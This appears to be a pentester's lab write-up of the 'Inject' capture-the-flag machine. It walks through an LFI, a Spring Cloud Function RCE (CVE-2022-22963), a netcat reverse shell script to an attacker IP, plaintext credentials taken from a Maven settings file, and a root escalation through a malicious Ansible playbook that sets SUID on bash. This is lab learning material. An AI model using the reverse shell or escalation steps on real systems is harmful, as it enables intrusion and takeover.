202303211840
Status: #ansible #yml #LFI #java
Tags: [Labs]

# Inject
IP: 10.10.11.204

## Recon

Ports Open:

```
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

Port 8080:

- nagios-nsca Nagios NSCA
- Can upload files at `/upload`
- Possible filters in place for the upload function

![[inject_filters.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/inject_filters.png">

- After testing out the upload functionality and intercepting the requests on Burp, we notice that there is an `img` parameter that was vulnerable to LFI

![[inject_lfi.png]]


<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/inject_lfi.png">

- We were able to find a specific file within the webapp directory that listed dependancies
- One interesting dependancy was `spring cloud function web 3.2.2`
- This dependancy was vulnerable to RCE `CVE-2022-22963`
- All we had to do was supply a new header for a post request and give it a value that executes system commands

![[inject_rce.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/inject_rce.png">

## Establish Foothold

- With RCE, we are able to upload a bash script that gives us a reverse shell

```bash
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.11 9001 >/tmp/f
```

- After uploading this file, we now had a reverse shell as the user frank
- After some manual enumeration, we found an interesting directory `.m2` in frank's home directory
- There was a file called `settings.xml` that contained plain-text credentials that worked with the user phil via the su command

```xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>

```

## Escalate Privileges

- Going into the `opt`, we notice an interesting directory into another directory `automation/tasks/` that contains a yml file
- Doing some research shows that yml file is used with ansible
- This could lead to privilege escalation by creating our own yml file that contains a command that way when the task is executed by root, we can get a shell as root
- Our `evil.yml` file contains

```yml
- hosts: localhost
  tasks:
    - name: RShell
      command: sudo chmod +s /bin/bash
```

- Now we wait and finally see that the bash binary has suid permissions
- We can now execute `/bin/bash -p` and we are now root


---
# References

- Spring Cloud RCE - https://sysdig.com/blog/cve-2022-22963-spring-cloud/
- Ansible Playbook Privesc - https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/